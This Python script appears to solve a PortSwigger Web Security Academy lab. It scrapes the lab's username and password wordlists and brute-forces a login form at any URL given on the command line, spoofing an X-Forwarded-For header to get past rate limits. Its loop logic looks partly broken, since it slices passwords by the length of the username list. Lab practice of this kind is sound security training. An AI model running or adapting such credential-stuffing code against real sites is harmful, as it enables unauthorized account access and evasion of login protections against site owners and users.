import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import random
import socket
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxy = {'http':'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def scrap_username():
    url = "https://portswigger.net/web-security/authentication/auth-lab-usernames"
    r = requests.get(url, verify=False, proxies=proxy)
    res = r.text
    soup = BeautifulSoup(res, 'html.parser')
    for word in soup.code.contents:
        word = word.split('\n')
        username_list = word
    print(username_list)
    return username_list

def scrap_password():
    url = 'https://portswigger.net/web-security/authentication/auth-lab-passwords'
    r = requests.get(url, verify=False, proxies=proxy)
    res = r.text
    soup = BeautifulSoup (res, 'html.parser')
    for word in soup.code.contents:
        word = word.split('\n')
        password_list = word
    return password_list


def generate_random_ip():
  ip_parts = [random.randint(0, 255) for _ in range(4)]
  return socket.inet_ntoa(bytes(ip_parts))


def admin_cred(url):
    username = scrap_username()
    password_list = scrap_password()
    random_ip = generate_random_ip()
    for i in range(0, len(username), 3):
        # Pour chaque élément de la première liste
        for u in username:
            # Pour chaque élément du groupe de 3 éléments de la seconde liste
            for p in password_list[i:i + 3]:
                creds = {
                    'username': u,
                    'password': p
                    }
                header = {'X-Forwarded-For': '%s' % random_ip}
                r = requests.post(url, verify=False, proxies=proxy, data=creds, headers=header)
                res = r.text
                print(u, p)
                if "Invalid username or password." not in res:
                    print("[+] Password found : %s" % p)
                    print("[+] Admin creds are : %s , %s" % (u, p))
                    break


def main():
    if len(sys.argv) != 2:
        print("[+] Usage: %s <url> " % sys.argv[0])
        print("[+] Example: %s www.example.com " % sys.argv[0])
        sys.exit(-1)
    url = sys.argv[1].strip()
    print("[+] Brute forcing the shit out of the website...")
    admin_cred(url)


if __name__=="__main__":
    main()